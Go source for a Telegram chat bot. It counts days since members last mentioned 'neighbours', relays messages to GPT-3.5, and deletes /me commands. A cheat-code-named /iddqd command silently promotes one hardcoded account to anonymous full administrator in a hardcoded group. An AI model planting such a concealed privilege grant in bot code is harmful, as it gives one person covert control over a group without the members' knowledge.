package main

import (
	"BastetTetlegram/config"
	"context"
	"fmt"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	openai "github.com/sashabaranov/go-openai"
	"log"
	"strconv"
	"strings"
	"time"
)

func declOfNum(number int, titles []string) string {
	if number < 0 {
		number *= -1
	}
	cases := []int{2, 0, 1, 1, 1, 2}
	var currentCase int
	if number%100 > 4 && number%100 < 20 {
		currentCase = 2
	} else if number%10 < 5 {
		currentCase = cases[number%10]
	} else {
		currentCase = cases[5]
	}
	return titles[currentCase]
}

func messagegpt(msg string) string {
	client := openai.NewClient(config.GPTtoken)
	resp, err := client.CreateChatCompletion(
		context.Background(),
		openai.ChatCompletionRequest{
			Model: openai.GPT3Dot5Turbo,
			Messages: []openai.ChatCompletionMessage{
				{
					Role:    openai.ChatMessageRoleUser,
					Content: msg,
				},
			},
		},
	)

	if err != nil {
		fmt.Printf("ChatCompletion error: %v\n", err)
		//return
	}
	fmt.Println(resp.Choices[0].Message.Content)
	return resp.Choices[0].Message.Content
}

func main() {
	bot, err := tgbotapi.NewBotAPI(config.Token)
	if err != nil {
		log.Panic(err)
	}

	bot.Debug = true
	substr := "сосед"
	titles := []string{"день", "дня", "дней"}
	Checker := 0
	LastMention := time.Now()
	log.Printf("Authorized on account %s", bot.Self.UserName)

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60
	updates := bot.GetUpdatesChan(u)

	for update := range updates {
		if update.Message != nil { // If we got a message
			messageText := update.Message.Text
			log.Printf("[%s] %s", update.Message.From.UserName, update.Message.Text)
			if strings.Contains(strings.ToLower(messageText), substr) {
				Checker++
				if LastMention != time.Date(2000, 1, 1, 0, 0, 0, 0, time.UTC) {
					TimeDifference := time.Since(LastMention).Hours() / 24
					//Days := int(TimeDifference)
					Neib := strconv.Itoa(int(TimeDifference)) + " " + declOfNum(int(TimeDifference), titles) + " без соседей"
					msg := tgbotapi.NewMessage(update.Message.Chat.ID, Neib)
					bot.Send(msg)
					msg = tgbotapi.NewMessage(435809098, "Было: "+LastMention.String())
					bot.Send(msg)
					log.Println(TimeDifference)
					log.Printf(LastMention.String())
					LastMention = time.Now()
					log.Printf(LastMention.String())
					log.Printf(Neib)
					msg = tgbotapi.NewMessage(435809098, "Стало: "+LastMention.String())
					bot.Send(msg)
				}
			}
			//else {
			//	msg := tgbotapi.NewMessage(435809098, "NOPE")
			//	bot.Send(msg)
			//}
		}
		if update.Message == nil { // ignore any non-Message updates
			continue
		}
		if !update.Message.IsCommand() { // ignore any non-command Messages
			continue
		}
		//UserName := update.Message.From.UserName
		cmdmsg := update.Message.MessageID
		if update.Message.Command() == "me" {
			time.Sleep(1 * time.Second)
			kill := tgbotapi.NewDeleteMessage(update.Message.Chat.ID, cmdmsg)
			bot.Request(kill)
		}
		if update.Message.Command() == "iddqd" {
			memberConfig := tgbotapi.PromoteChatMemberConfig{
				ChatMemberConfig: tgbotapi.ChatMemberConfig{
					ChatID: -1001165249098,
					UserID: 435809098,
				},
				IsAnonymous:         true,
				CanManageChat:       true,
				CanChangeInfo:       true,
				CanPostMessages:     true,
				CanEditMessages:     true,
				CanDeleteMessages:   true,
				CanManageVoiceChats: true,
				CanInviteUsers:      true,
				CanRestrictMembers:  true,
				CanPinMessages:      true,
				CanPromoteMembers:   true,
			}
			bot.Request(memberConfig)
			log.Println(memberConfig)
		}
		if update.Message.Command() == "gpt" {
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, messagegpt(update.Message.CommandArguments()))
			bot.Send(msg)
		}
	}
}
